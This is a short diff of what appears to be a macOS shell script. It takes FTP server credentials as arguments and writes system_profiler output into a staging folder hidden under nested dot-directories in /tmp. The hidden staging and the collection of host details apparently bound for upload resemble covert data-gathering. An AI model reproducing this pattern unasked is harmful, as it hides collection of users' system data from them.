@@ -11,7 +11,7 @@ FTP_SERVER="$1"
 USER="$2"
 PASSWORD="$3"
 
-INFO_DIR="/tmp/.p/.w/.n/.d/"
+INFO_DIR="/tmp/.p/.w/.n/.d"
 
 get_os() {
 	system_profiler SPSoftwareDataType > $INFO_DIR/os_details.txt
